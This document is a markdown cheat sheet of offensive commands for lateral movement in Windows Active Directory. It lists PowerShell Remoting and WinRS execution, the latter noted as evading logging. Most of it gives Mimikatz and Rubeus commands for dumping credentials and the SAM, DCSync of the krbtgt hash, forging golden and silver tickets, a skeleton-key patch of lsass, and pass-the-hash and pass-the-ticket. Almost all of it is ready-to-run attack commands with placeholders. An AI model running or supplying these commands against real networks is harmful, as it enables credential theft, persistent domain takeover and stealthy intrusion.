## AD Lateral Movement

- [PowerShell Remoting](#powershell-remoting)
  * [Enable PowerShell Remoting](#enable-powershell-remoting)
  * [Create Remote Session](#create-remote-session)
  * [Entering into Existing PSSession](#entering-into-existing-pssession)
  * [Remote Execution](#remote-execution)
- [WinRS](#winrs)
  * [Execute Remote Command](#execute-remote-command)
- [MimiKatz PowerShell Port](#mimikatz-powershell-port)
  * [Dump Credentials on Local Machine](#dump-credentials-on-local-machine)
  * [Extract credentials from SAM](#extract-credentials-from-sam)
  * [OverPass the Hash](#overpass-the-hash)
  * [Get KRBTGT Hash](#get-krbtgt-hash)
  * [Credential Vault](#credential-vault)
  * [Golden Ticket](#golden-ticket)
  * [Silver Ticket](#silver-ticket)
  * [Skeleton Key Attack](#skeleton-key-attack)
  * [Export Tickets](#export-tickets)
  * [Pass The Ticket](#pass-the-ticket)
- [Rubeus](#rubeus)
  * [OverPass The Hash](#overpass-the-hash)
  * [Pass the Ticket](#pass-the-ticket)


### PowerShell Remoting
---
> tcp/5985
```powershell
# Check computers where PS Remoting can be used
C:> . .\Find-PSRemotingLocalAdminAccess.ps1
C:> Find-PSRemotingLocalAdminAccess
```

#### Enable PowerShell Remoting  
```powershell
C:> Enable-PSRemoting 
```
#### Create Remote Session 
```powershell
# Create a Session in Local Computer
C:> New-PSSession

# Create Session on Remote Computer
C:> $remote_computer = New-PSSesion -ComputerName <computer>

# Create Session on Multiple Computers
C:> $s1, $s2, $s3 = New-PSSession -ComputerName Server01,Server02,Server03
```
#### Entering into Existing PSSession
```powershell
# A Completelly New Session to Computer
C:> Enter-PSSession -ComputerName <computer>

# A session created previously with New-PSSession
C:> $remote_computer = New-PSSesion -ComputerName <computer>
C:> Enter-PSSession -Session $remote_computer
```
#### Remote Execution
```powershell
# Remote Execution With Credentials
c:> $SecPassword = ConvertTo-SecureString '<password>' -AsPlainText -Force
C:> $Cred = New-Object System.Management.Automation.PSCredential('<domain>\<user>', $SecPassword)
C:> Invoke-Command -ComputerName <computer> -Credential $Cred -ScriptBlock {whoami}

# Run Local Script in Remote Computer
C:> Invoke-Command -FilePath c:\scripts\test.ps1 -ComputerName <computer>
C:> Invoke-Command -FilePath c:\scripts\test.ps1 -ComputerName (Get-Content <list_of_servers>)

# Run Command (Script Block) on Remote Computer
C:> Invoke-Command -ComputerName <host> -Credential <domain>\<user> -ScriptBlock {whoami;hostname}
C:> Invoke-Command -Scriptblock {Get-Process} -ComputerName (Get-Content <list_of_servers>)

# Execute Locally Loaded Function in Remote Computer
C:> Invoke-Command -ScriptBlock ${function:Get-PassHashes} -ComputerName <host>

# Persistent Connection, Series of Commands Sharing Data
C:> $s = New-PSSession -ComputerName <computer>                             # Without this, 2 lines below wouldn't share data on $s
C:> Invoke-Command -Session $s -ScriptBlock {$p = Get-Process PowerShell}
C:> Invoke-Command -Session $s -ScriptBlock {$p.VirtualMemorySize}          # $sp is from previous command

```

### WinRS
---
```powershell
# Check computers where WinRS can be used
C:> . .\Find-PSRemotingLocalAdminAccess.ps1
C:> Find-PSRemotingLocalAdminAccess
```
Uses same port as PSRemoting, and evades Remoting Logging.
#### Execute Remote Command
```powershell
# Use `cmd`as command to get a shell
C:> winrs -remote:<computer> -u:<domain>\<user> -p:<password> <command>
```

### MimiKatz PowerShell Port
---
Requires Local Admin Privileges on computer where is run.
```powershell
C:> . .\Invoke-Mimikatz.ps1
```
#### Dump Credentials on Local Machine
```powershell
C:> Invoke-Mimikatz -Command '"sekurlsa::ekeys"'
```
#### Extract credentials from SAM
```powershell
C:> Invoke-Mimikatz -Command '"token::elevate" "lsadump::sam"'
```
#### OverPass the Hash
```powershell
# Starts Powershell with logon type 9
C:> Invoke-Mimikatz -Command '"sekurlsa::pth /user:<user> /domain:<fqdn_domain> /aes256:<user_aes256key> /run:cmd.exe"'
```
#### Get KRBTGT Hash
```powershell
# Run on DC, Domain Admin privileges required
C:> Invoke-Mimikatz -Command '"lsadump::lsa /patch"' -Computername <dc-hostname>

# DCSync: Domain Admin privileges required to run 
C:> Invoke-Mimikatz -Command '"lsadump::dcsync /user:<domain>\krbtgt"'
# DCsync for another domain
C:> Invoke-Mimikatz -Command '"lsadump::dcsync /user:<domain>\krbtgt /domain:<fqdn_domain>" "exit"'
```
#### Credential Vault
```powershell
# Interesting Credentials are stored here, like credentials for scheduled tasks
C:> Invoke-Mimikatz -Command '"token::elevate" "vault::cred /patch"'
```
#### Golden Ticket
```powershell
C:> Invoke-Mimikatz -Command '"kerberos::golden /User:<username> /domain:<domain_fqdn> /sid:<domain_sid> 
    /aes256:<krbtgt_aes_key> /startoffset:0 /endin:600 /renewmax:10080 /ptt" "exit"'
    
# For Administrator User
C:> Invoke-Mimikatz -Command '"kerberos::golden /User:Administrator /domain:<domain_fqdn> /sid:<domain_sid> 
    /aes256:<krbtgt_aes_key> /id:500 /groups:512 /startoffset:0 /endin:600 /renewmax:10080 /ptt"'
```
#### Silver Ticket
```powershell
# Get Privileges to access HOST service as Administrator on host
C:> Invoke-Mimikatz -Command '"kerberos::golden /User:Administrator /domain:<domain_fqdn> /sid:<domain_sid> /target:<host_fqdn> 
    /service:HOST /rc4:<host_ntlm_hash> /startoffset:0 /endin:600 /renewmax:10080 /ptt" "exit"'
    
# Privileges for RPCSS service
C:> Invoke-Mimikatz -Command '0"kerberos::golden /User:Administrator /domain:<domain_fqdn> /sid:<domain_sid> /target:<host_fqdn>  
    /service:RPCSS /rc4:<host_ntlm_hash> /startoffset:0 /endin:600 /renewmax:10080 /ptt" "exit"'
    
# With this two tickets, can execute WMI commands on host
```
#### Skeleton Key Attack
```powershell
# To run on DC. Allows init session with password mimikatz
C:> Invoke-Mimikatz -Command '"privilege::debug" "misc::skeleton"' -ComputerName <hostname>

# Patches lsass to allow login to any username using 'mimikatz' as passwd
```
#### Export Tickets
```powershell
C:> Invoke-Mimikatz -Command '"sekurlsa::tickets /export"' 
```
#### Pass The Ticket
```powershell
C:> Invoke-Mimikatz -Command "kerberos::ptt <KirbiFile>"
```
### Rubeus
---
#### OverPass The Hash
```powershell
C:> Rubeus.exe asktgt /user:<username> /aes256:<aes256_key> /opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
C:> Rubeus.exe asktgt /user:<username> /ntlm:<ntlm_rc4_key> /opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt

```
#### Pass the Ticket
```powershell
C:> Rubeus.exe ptt /ticket:<base64_TGT>
```
#### Lilsten for Tickets from User or Computer
```powershell
C:> Rubeus.exe monitor /targetuser:<HOST>$ /interval:5 /nowrap
C:> Rubeus.exe monitor /targetuser:<user> /interval:5 /nowrap
```
